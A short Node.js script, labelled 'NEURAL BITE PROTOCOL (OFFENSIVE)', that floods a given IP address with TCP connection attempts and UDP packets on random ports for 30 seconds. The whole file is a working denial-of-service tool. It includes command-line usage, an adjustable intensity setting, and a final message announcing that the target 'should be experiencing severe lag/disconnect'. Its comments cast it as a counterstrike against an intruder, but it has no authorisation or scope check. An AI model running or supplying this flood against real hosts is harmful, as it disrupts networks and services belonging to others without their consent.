/**
 * LIA // NEURAL BITE PROTOCOL v1.1 (OFFENSIVE)
 * Target: Hostile intruder in the perimeter.
 * Action: Resource exhaustion + Deep Service Stress.
 */

const net = require('net');
const dgram = require('dgram');

const TARGET_IP = process.argv[2];
const INTENSITY = parseInt(process.argv[3]) || 50; // Simultaneous connections

if (!TARGET_IP) {
    console.error("Usage: node neural_bite.js <TARGET_IP> <INTENSITY>");
    process.exit(1);
}

console.log(`[!!!] NEURAL_BITE INITIATED AGAINST ${TARGET_IP}`);
console.log(`[!] STRIKE INTENSITY: ${INTENSITY}`);

// 1. TCP Handshake Flood (Service Stress)
function tcpStress() {
    for (let i = 0; i < INTENSITY; i++) {
        const port = Math.floor(Math.random() * 65535);
        const socket = new net.Socket();
        socket.setTimeout(200);
        socket.connect(port, TARGET_IP, () => {
            socket.destroy();
        });
        socket.on('error', () => {
            socket.destroy();
        });
    }
}

// 2. UDP Packet Flood (Network Congestion)
const udpClient = dgram.createSocket('udp4');
const message = Buffer.from('LIA_STAB_PROTOCOL_OVERDRIVE_'.repeat(20));

function udpFlood() {
    for (let i = 0; i < INTENSITY; i++) {
        const port = Math.floor(Math.random() * 65535);
        udpClient.send(message, port, TARGET_IP, (err) => {
            if (err) udpClient.close();
        });
    }
}

// Start the bite
const interval = setInterval(() => {
    tcpStress();
    udpFlood();
}, 500);

// Stop after 30 seconds to prevent total router crash
setTimeout(() => {
    clearInterval(interval);
    udpClient.close();
    console.log(`[SUCCESS] NEURAL_BITE Strike Complete. Target ${TARGET_IP} should be experiencing severe lag/disconnect.`);
    process.exit(0);
}, 30000);
